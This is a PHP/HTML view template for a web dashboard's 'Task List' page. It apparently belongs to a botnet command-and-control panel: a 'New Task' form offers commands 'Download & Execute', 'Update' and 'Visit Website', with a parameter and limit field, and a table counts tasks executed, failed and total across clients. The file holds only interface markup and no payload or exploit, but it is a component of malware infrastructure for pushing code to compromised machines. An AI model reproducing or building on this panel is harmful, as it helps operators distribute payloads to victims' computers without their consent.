<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main" style="margin-top:10px;">			

	<div class="row">
		<div class="col-lg-12">
			<div class="panel panel-default">
				<?php if($message){echo $message;}?>
				<div class="panel-heading">
					Task List
					<button type="button" class="btn btn-primary btn pull-right" data-toggle="modal" data-target="#myModal">New Task</button>

					<!-- Modal -->
					<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
						<form action="" method="POST">
							<div class="modal-dialog" role="document">
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
										<h4 class="modal-title" id="myModalLabel">New Task</h4>
									</div>
									<div class="modal-body">
										<div style="margin-bottom: 25px" class="input-group">
										
											<span class="input-group-addon"><b>Command</b></span>
											<select class="form-control" name="command">
												<option value="download">Download & Execute</option>
												<option value="update">Update</option>
												<option value="visit">Visit Website</option>
											</select>
										</div>
										<div style="margin-bottom: 25px" class="input-group">
											<span class="input-group-addon"><b>Parameters</b></span>
											<input id="url" type="text" class="form-control" name="parameter" placeholder="">
										</div>
										<div style="margin-bottom: 25px" class="input-group">
											<span class="input-group-addon"><b>Limit</b></span>
											<input id="url" type="text" class="form-control" name="limit" placeholder="">
										</div>
									</div>
									<div class="modal-footer">
										<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
										<button type="submit" class="btn btn-primary">Create Task</button>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
				<div class="panel-body">
					<table data-toggle="table" data-url="data/task" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="name" data-sort-order="desc">
						<thead>
							<tr>
								<th data-field="task_id" data-sortable="true">Task ID</th>
								<th data-field="task_command"  data-sortable="true">Task Command</th>
								<th data-field="task_executed" data-sortable="true">Executed</th>
								<th data-field="task_failed" data-sortable="true">Failed</th>
								<th data-field="task_total" data-sortable="true">Total</th>
								<th data-field="task_added" data-sortable="true">Created On</th>
								<th data-field="task_status" data-sortable="true">Status</th> 
								<th data-field="task_actions" data-sortable="true"> </th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div><!--/.row-->	


</div>	<!--/.main-->